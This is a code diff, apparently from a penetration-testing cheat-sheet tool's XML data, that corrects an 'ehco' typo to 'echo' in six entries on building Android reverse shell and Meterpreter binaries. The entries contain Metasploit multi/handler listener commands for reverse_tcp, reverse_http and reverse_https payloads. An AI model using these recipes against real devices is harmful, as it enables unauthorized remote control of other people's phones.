@@ -4167,7 +4167,7 @@ None, use regular shell.</info>
             <info>Build a reverse shell binary for an Android machine.
 
 Listener:
-    msfconsole -r &lt;(ehco '
+    msfconsole -r &lt;(echo '
         use exploit/multi/handler
         set PAYLOAD android/shell/reverse_tcp
         set LHOST [return ip]
@@ -4184,7 +4184,7 @@ Sign APK:
             <info>Build a reverse shell over HTTP binary for an Android machine.
 
 Listener:
-    msfconsole -r &lt;(ehco '
+    msfconsole -r &lt;(echo '
         use exploit/multi/handler
         set PAYLOAD android/shell/reverse_http
         set LHOST [return ip]
@@ -4201,7 +4201,7 @@ Sign APK:
             <info>Build a reverse shell over HTTPS binary for an Android machine.
 
 Listener:
-    msfconsole -r &lt;(ehco '
+    msfconsole -r &lt;(echo '
         use exploit/multi/handler
         set PAYLOAD android/shell/reverse_https
         set LHOST [return ip]
@@ -4218,7 +4218,7 @@ Sign APK:
             <info>Build a reverse meterpreter shell binary for an Android machine.
 
 Listener:
-    msfconsole -r &lt;(ehco '
+    msfconsole -r &lt;(echo '
         use exploit/multi/handler
         set PAYLOAD android/meterpreter/reverse_tcp
         set LHOST [return ip]
@@ -4236,7 +4236,7 @@ Sign APK:
             <info>Build a reverse meterpreter shell over HTTP binary for an Android machine.
 
 Listener:
-    msfconsole -r &lt;(ehco '
+    msfconsole -r &lt;(echo '
         use exploit/multi/handler
         set PAYLOAD android/meterpreter/reverse_http
         set LHOST [return ip]
@@ -4253,7 +4253,7 @@ Sign APK:
             <info>Build a reverse meterpreter shell over HTTPS binary for an Android machine.
             
 Listener:
-    msfconsole -r &lt;(ehco '
+    msfconsole -r &lt;(echo '
         use exploit/multi/handler
         set PAYLOAD android/meterpreter/reverse_https
         set LHOST [return ip]
